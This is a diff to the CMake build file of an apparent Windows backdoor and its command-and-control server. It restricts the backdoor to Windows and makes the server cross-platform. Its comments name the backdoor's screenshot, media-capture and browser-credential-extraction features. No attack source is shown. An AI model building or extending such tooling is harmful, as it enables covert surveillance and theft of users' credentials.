@@ -7,7 +7,8 @@ set(CMAKE_CXX_STANDARD 17)
 
 include_directories(include)
 
-# Backdoor executable (client)
+# Backdoor executable (client) - Windows only
+if(WIN32)
 add_executable(backdoor
     src/backdoor.c
     src/logger.c
@@ -26,6 +27,7 @@ add_executable(backdoor
     # Uncomment and add sqlite3.c when using browser credential extraction:
     # src/sqlite3.c
 )
+endif()
 
 # Server executable (C2)
 add_executable(server
@@ -34,7 +36,8 @@ add_executable(server
     src/str_cut.c
 )
 
-# Backdoor libraries
+# Backdoor libraries (Windows only)
+if(WIN32)
 target_link_libraries(backdoor
     ws2_32      # WinSock2 networking
     gdi32       # Graphics (screenshots)
@@ -48,21 +51,30 @@ target_link_libraries(backdoor
     # mfreadwrite # Media Foundation
     # mfuuid    # Media Foundation GUIDs
 )
+endif()
 
-# Server libraries
-target_link_libraries(server
-    ws2_32      # WinSock2 networking
-)
+# Server libraries (cross-platform)
+if(WIN32)
+    target_link_libraries(server
+        ws2_32      # WinSock2 networking
+    )
+else()
+    find_package(Threads REQUIRED)
+    target_link_libraries(server
+        Threads::Threads    # POSIX threads
+    )
+endif()
 
 # Compiler definitions
-target_compile_definitions(backdoor PRIVATE
-    _CRT_SECURE_NO_WARNINGS
-    # USE_SQLITE  # Uncomment when sqlite3.c is added for browser creds
-)
-
-target_compile_definitions(server PRIVATE
-    _CRT_SECURE_NO_WARNINGS
-)
+if(WIN32)
+    target_compile_definitions(backdoor PRIVATE
+        _CRT_SECURE_NO_WARNINGS
+        # USE_SQLITE  # Uncomment when sqlite3.c is added for browser creds
+    )
+    target_compile_definitions(server PRIVATE
+        _CRT_SECURE_NO_WARNINGS
+    )
+endif()
 
 # Note: For full browser credential extraction, download sqlite3 amalgamation:
 # https://www.sqlite.org/download.html -> sqlite-amalgamation-*.zip
